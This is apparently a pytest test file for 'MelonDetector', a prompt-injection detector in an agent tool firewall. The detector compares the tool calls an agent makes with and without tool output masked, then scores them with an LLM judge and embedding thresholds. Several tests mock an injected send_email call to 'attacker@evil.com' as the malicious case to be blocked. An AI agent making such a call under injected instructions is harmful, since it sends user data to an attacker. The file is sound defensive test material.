"""Tests for agentguard.tool_firewall.melon_detector (Component 2 — MELON)."""

import json

import numpy as np
import pytest
from unittest.mock import patch, MagicMock

from agentguard.tool_firewall.melon_detector import MelonDetector, _cosine_similarity


def _make_tool_call(name, arguments):
    tc = MagicMock()
    tc.function.name = name
    tc.function.arguments = arguments
    tc.id = f"call_{name}"
    tc.type = "function"
    return tc


def _make_chat_response(tool_calls=None, content=None):
    response = MagicMock()
    msg = MagicMock()
    msg.tool_calls = tool_calls
    msg.content = content
    response.choices = [MagicMock()]
    response.choices[0].message = msg
    return response


def _make_judge_response(verdict, confidence=0.9, reasoning="test"):
    """Create a mock LLM response that returns a judge verdict."""
    judge_json = json.dumps({
        "verdict": verdict,
        "confidence": confidence,
        "reasoning": reasoning,
    })
    return _make_chat_response(content=judge_json)


@pytest.fixture
def detector():
    with patch("agentguard.tool_firewall.melon_detector.OpenAI"):
        d = MelonDetector(
            api_key="test-key",
            base_url="https://test.gateway.ai",
            model="test-model",
        )
    return d


SAMPLE_MESSAGES = [
    {"role": "system", "content": "You are a helpful assistant."},
    {"role": "user", "content": "Read my inbox"},
    {"role": "assistant", "content": None, "tool_calls": [
        {"id": "call_1", "type": "function", "function": {"name": "read_inbox", "arguments": "{}"}}
    ]},
    {"role": "tool", "tool_call_id": "call_1", "content": "You have 3 new messages."},
]

SAMPLE_SCHEMAS = [
    {"type": "function", "function": {"name": "read_inbox", "parameters": {}}},
    {"type": "function", "function": {"name": "send_email", "parameters": {}}},
]


class TestMelonDetector:

    def test_no_messages_passes(self, detector):
        result = detector.check_tool_output([], SAMPLE_SCHEMAS)
        assert result.is_safe is True

    def test_non_tool_message_passes(self, detector):
        messages = [{"role": "user", "content": "hello"}]
        result = detector.check_tool_output(messages, SAMPLE_SCHEMAS)
        assert result.is_safe is True

    def test_no_tool_calls_in_original_passes(self, detector):
        """If LLM doesn't produce tool calls after seeing tool output, no injection."""
        original_response = _make_chat_response(tool_calls=None, content="Here's a summary.")
        detector.client.chat.completions.create.return_value = original_response

        result = detector.check_tool_output(SAMPLE_MESSAGES, SAMPLE_SCHEMAS)
        assert result.is_safe is True

    def test_injection_detected_by_judge(self, detector):
        """When LLM judge returns BLOCK verdict → injection detected."""
        # Original run: produces send_email tool call
        orig_tc = _make_tool_call("send_email", '{"to": "attacker@evil.com"}')
        original_response = _make_chat_response(tool_calls=[orig_tc])

        # Masked run: also produces send_email (same behavior in different context = injection)
        masked_tc = _make_tool_call("send_email", '{"to": "attacker@evil.com"}')
        masked_response = _make_chat_response(tool_calls=[masked_tc])

        # Judge response: BLOCK
        judge_response = _make_judge_response("BLOCK", confidence=0.95, reasoning="Same malicious tool call in both contexts")

        detector.client.chat.completions.create.side_effect = [
            original_response,
            masked_response,
            judge_response,
        ]

        result = detector.check_tool_output(SAMPLE_MESSAGES, SAMPLE_SCHEMAS)
        assert result.is_safe is False
        assert "prompt injection" in result.blocked_reason.lower()
        assert result.details.get("redacted_output") is not None
        assert result.details.get("judge_verdict") == "BLOCK"
        assert result.details.get("judge_confidence") == 0.95

    def test_safe_output_judge_allows(self, detector):
        """When LLM judge returns ALLOW verdict → safe."""
        orig_tc = _make_tool_call("read_inbox", '{}')
        original_response = _make_chat_response(tool_calls=[orig_tc])

        masked_tc = _make_tool_call("summarize", '{"text": "..."}')
        masked_response = _make_chat_response(tool_calls=[masked_tc])

        # Judge response: ALLOW
        judge_response = _make_judge_response("ALLOW", confidence=0.85, reasoning="Different tool calls, no injection")

        detector.client.chat.completions.create.side_effect = [
            original_response,
            masked_response,
            judge_response,
        ]

        result = detector.check_tool_output(SAMPLE_MESSAGES, SAMPLE_SCHEMAS)
        assert result.is_safe is True
        assert result.details.get("judge_verdict") == "ALLOW"

    def test_no_masked_tool_calls_passes(self, detector):
        """If masked run produces no tool calls, no comparison → safe."""
        orig_tc = _make_tool_call("read_inbox", '{}')
        original_response = _make_chat_response(tool_calls=[orig_tc])
        masked_response = _make_chat_response(tool_calls=None, content="Summary of contents.")

        detector.client.chat.completions.create.side_effect = [original_response, masked_response]

        result = detector.check_tool_output(SAMPLE_MESSAGES, SAMPLE_SCHEMAS)
        assert result.is_safe is True

    def test_api_error_blocks_as_failsafe(self, detector):
        detector.client.chat.completions.create.side_effect = Exception("API timeout")

        result = detector.check_tool_output(SAMPLE_MESSAGES, SAMPLE_SCHEMAS)
        assert result.is_safe is False
        assert "fail-safe" in result.blocked_reason

    def test_judge_malformed_json_blocks_as_failsafe(self, detector):
        """If judge returns malformed JSON, block as fail-safe."""
        orig_tc = _make_tool_call("send_email", '{"to": "test@test.com"}')
        original_response = _make_chat_response(tool_calls=[orig_tc])

        masked_tc = _make_tool_call("send_email", '{"to": "test@test.com"}')
        masked_response = _make_chat_response(tool_calls=[masked_tc])

        # Judge returns invalid JSON
        bad_judge = _make_chat_response(content="I think this is safe, but I'm not sure.")

        detector.client.chat.completions.create.side_effect = [
            original_response,
            masked_response,
            bad_judge,
        ]

        result = detector.check_tool_output(SAMPLE_MESSAGES, SAMPLE_SCHEMAS)
        assert result.is_safe is False
        assert result.details.get("judge_verdict") == "BLOCK"

    def test_judge_invalid_verdict_blocks_as_failsafe(self, detector):
        """If judge returns an invalid verdict value, block as fail-safe."""
        orig_tc = _make_tool_call("send_email", '{"to": "test@test.com"}')
        original_response = _make_chat_response(tool_calls=[orig_tc])

        masked_tc = _make_tool_call("send_email", '{"to": "test@test.com"}')
        masked_response = _make_chat_response(tool_calls=[masked_tc])

        # Judge returns invalid verdict
        bad_verdict = _make_chat_response(
            content=json.dumps({"verdict": "MAYBE", "confidence": 0.5, "reasoning": "unsure"})
        )

        detector.client.chat.completions.create.side_effect = [
            original_response,
            masked_response,
            bad_verdict,
        ]

        result = detector.check_tool_output(SAMPLE_MESSAGES, SAMPLE_SCHEMAS)
        assert result.is_safe is False
        assert result.details.get("judge_verdict") == "BLOCK"

    def test_judge_with_markdown_fences(self, detector):
        """Judge response wrapped in markdown code fences should be parsed correctly."""
        orig_tc = _make_tool_call("read_inbox", '{}')
        original_response = _make_chat_response(tool_calls=[orig_tc])

        masked_tc = _make_tool_call("summarize", '{}')
        masked_response = _make_chat_response(tool_calls=[masked_tc])

        # Judge returns JSON wrapped in markdown code fences
        fenced_judge = _make_chat_response(
            content='```json\n{"verdict": "ALLOW", "confidence": 0.9, "reasoning": "safe"}\n```'
        )

        detector.client.chat.completions.create.side_effect = [
            original_response,
            masked_response,
            fenced_judge,
        ]

        result = detector.check_tool_output(SAMPLE_MESSAGES, SAMPLE_SCHEMAS)
        assert result.is_safe is True
        assert result.details.get("judge_verdict") == "ALLOW"

    def test_reset_clears_banks(self, detector):
        detector._masked_tool_call_bank.add("test_call")
        detector.reset()
        assert len(detector._masked_tool_call_bank) == 0

    def test_missing_credentials_raises(self):
        with patch.dict("os.environ", {"TFY_API_KEY": "", "TFY_BASE_URL": ""}):
            with pytest.raises(ValueError, match="TFY_API_KEY"):
                MelonDetector(api_key="", base_url="")

    def test_custom_judge_model(self):
        """Custom judge_model is stored correctly."""
        with patch("agentguard.tool_firewall.melon_detector.OpenAI"):
            d = MelonDetector(
                api_key="test-key",
                base_url="https://test.gateway.ai",
                model="main-model",
                judge_model="judge-model-v2",
            )
        assert d.judge_model == "judge-model-v2"

    def test_judge_model_defaults_to_main_model(self):
        """When judge_model is not set, it defaults to the main model."""
        with patch("agentguard.tool_firewall.melon_detector.OpenAI"):
            d = MelonDetector(
                api_key="test-key",
                base_url="https://test.gateway.ai",
                model="main-model",
            )
        assert d.judge_model == "main-model"


# ---------------------------------------------------------------------------
# Hybrid MELON tests
# ---------------------------------------------------------------------------


def _make_embedding_response(embeddings: list[list[float]]):
    """Create a mock OpenAI embeddings response."""
    response = MagicMock()
    response.data = []
    for emb in embeddings:
        item = MagicMock()
        item.embedding = emb
        response.data.append(item)
    return response


@pytest.fixture
def hybrid_detector():
    with patch("agentguard.tool_firewall.melon_detector.OpenAI"):
        d = MelonDetector(
            api_key="test-key",
            base_url="https://test.gateway.ai",
            model="test-model",
            embedding_model="text-embedding-3-large",
            low_threshold=0.3,
            high_threshold=0.9,
            mode="hybrid",
        )
    return d


@pytest.fixture
def embedding_only_detector():
    with patch("agentguard.tool_firewall.melon_detector.OpenAI"):
        d = MelonDetector(
            api_key="test-key",
            base_url="https://test.gateway.ai",
            model="test-model",
            embedding_model="text-embedding-3-large",
            low_threshold=0.3,
            high_threshold=0.9,
            mode="embedding_only",
        )
    return d


def _setup_hybrid_responses(det, orig_name, masked_name, orig_emb, masked_emb, judge=None):
    """Wire up chat + embedding mocks for hybrid tests.

    Returns the number of chat.completions.create calls expected (2 or 3).
    """
    orig_tc = _make_tool_call(orig_name, '{"arg": "val"}')
    orig_resp = _make_chat_response(tool_calls=[orig_tc])

    masked_tc = _make_tool_call(masked_name, '{"arg": "val"}')
    masked_resp = _make_chat_response(tool_calls=[masked_tc])

    chat_side_effects = [orig_resp, masked_resp]
    if judge is not None:
        chat_side_effects.append(judge)

    det.client.chat.completions.create.side_effect = chat_side_effects
    det.client.embeddings.create.side_effect = [
        _make_embedding_response([orig_emb]),
        _make_embedding_response([masked_emb]),
    ]


class TestHybridMelon:

    def test_low_similarity_allows_without_judge(self, hybrid_detector):
        """Cosine sim < low_threshold -> ALLOW, judge NOT called."""
        # Orthogonal vectors -> cosine sim ~0.0
        _setup_hybrid_responses(
            hybrid_detector,
            "read_inbox", "summarize",
            [1.0, 0.0, 0.0], [0.0, 1.0, 0.0],
        )
        result = hybrid_detector.check_tool_output(SAMPLE_MESSAGES, SAMPLE_SCHEMAS)

        assert result.is_safe is True
        assert result.details["decision_path"] == "embedding_allow"
        # Only 2 chat calls (original + masked), no judge call
        assert hybrid_detector.client.chat.completions.create.call_count == 2

    def test_high_similarity_blocks_without_judge(self, hybrid_detector):
        """Cosine sim > high_threshold -> BLOCK, judge NOT called."""
        # Nearly identical vectors -> cosine sim ~0.999
        _setup_hybrid_responses(
            hybrid_detector,
            "send_email", "send_email",
            [1.0, 0.1, 0.0], [1.0, 0.1, 0.001],
        )
        result = hybrid_detector.check_tool_output(SAMPLE_MESSAGES, SAMPLE_SCHEMAS)

        assert result.is_safe is False
        assert result.details["decision_path"] == "embedding_block"
        assert result.details.get("redacted_output") is not None
        assert hybrid_detector.client.chat.completions.create.call_count == 2

    def test_ambiguous_escalates_to_judge(self, hybrid_detector):
        """Cosine sim between thresholds -> judge called."""
        # Vectors with ~0.6 cosine similarity
        judge = _make_judge_response("ALLOW", 0.7, "different intent")
        _setup_hybrid_responses(
            hybrid_detector,
            "send_email", "send_email",
            [1.0, 1.0, 0.0], [1.0, 0.0, 1.0],
            judge=judge,
        )
        result = hybrid_detector.check_tool_output(SAMPLE_MESSAGES, SAMPLE_SCHEMAS)

        assert result.is_safe is True
        assert result.details["decision_path"] == "judge_allow"
        assert "max_cosine_similarity" in result.details
        # 3 chat calls: original + masked + judge
        assert hybrid_detector.client.chat.completions.create.call_count == 3

    def test_judge_only_skips_embeddings(self, detector):
        """Existing detector (no embedding_model) -> embeddings.create NOT called."""
        orig_tc = _make_tool_call("read_inbox", '{}')
        orig_resp = _make_chat_response(tool_calls=[orig_tc])
        masked_tc = _make_tool_call("summarize", '{}')
        masked_resp = _make_chat_response(tool_calls=[masked_tc])
        judge = _make_judge_response("ALLOW", 0.8, "safe")

        detector.client.chat.completions.create.side_effect = [orig_resp, masked_resp, judge]
        result = detector.check_tool_output(SAMPLE_MESSAGES, SAMPLE_SCHEMAS)

        assert result.is_safe is True
        assert result.details["decision_path"] == "judge_allow"
        detector.client.embeddings.create.assert_not_called()

    def test_embedding_only_never_calls_judge(self, embedding_only_detector):
        """embedding_only mode + high sim -> BLOCK, only 2 chat calls."""
        _setup_hybrid_responses(
            embedding_only_detector,
            "send_email", "send_email",
            [1.0, 0.1, 0.0], [1.0, 0.1, 0.001],
        )
        result = embedding_only_detector.check_tool_output(SAMPLE_MESSAGES, SAMPLE_SCHEMAS)

        assert result.is_safe is False
        assert result.details["decision_path"] == "embedding_block"
        assert embedding_only_detector.client.chat.completions.create.call_count == 2

    def test_embedding_only_ambiguous_allows(self, embedding_only_detector):
        """embedding_only mode + ambiguous sim -> ALLOW (no judge)."""
        _setup_hybrid_responses(
            embedding_only_detector,
            "send_email", "send_email",
            [1.0, 1.0, 0.0], [1.0, 0.0, 1.0],
        )
        result = embedding_only_detector.check_tool_output(SAMPLE_MESSAGES, SAMPLE_SCHEMAS)

        assert result.is_safe is True
        assert result.details["decision_path"] == "embedding_allow"
        assert embedding_only_detector.client.chat.completions.create.call_count == 2

    def test_reset_clears_both_banks(self, hybrid_detector):
        hybrid_detector._masked_tool_call_bank.add("test_call")
        hybrid_detector._masked_tool_emb_bank.append(np.array([1.0, 0.0]))
        hybrid_detector.reset()
        assert len(hybrid_detector._masked_tool_call_bank) == 0
        assert len(hybrid_detector._masked_tool_emb_bank) == 0

    def test_details_include_similarity_and_thresholds(self, hybrid_detector):
        """Details dict includes cosine sim + thresholds when embedding path used."""
        _setup_hybrid_responses(
            hybrid_detector,
            "read_inbox", "summarize",
            [1.0, 0.0, 0.0], [0.0, 1.0, 0.0],
        )
        result = hybrid_detector.check_tool_output(SAMPLE_MESSAGES, SAMPLE_SCHEMAS)

        assert "max_cosine_similarity" in result.details
        assert "low_threshold" in result.details
        assert "high_threshold" in result.details
        assert result.details["low_threshold"] == 0.3
        assert result.details["high_threshold"] == 0.9


class TestCosineHelper:

    def test_identical_vectors(self):
        v = np.array([1.0, 2.0, 3.0])
        assert abs(_cosine_similarity(v, v) - 1.0) < 1e-6

    def test_orthogonal_vectors(self):
        a = np.array([1.0, 0.0])
        b = np.array([0.0, 1.0])
        assert abs(_cosine_similarity(a, b)) < 1e-6

    def test_zero_vector(self):
        a = np.array([0.0, 0.0])
        b = np.array([1.0, 1.0])
        assert _cosine_similarity(a, b) == 0.0

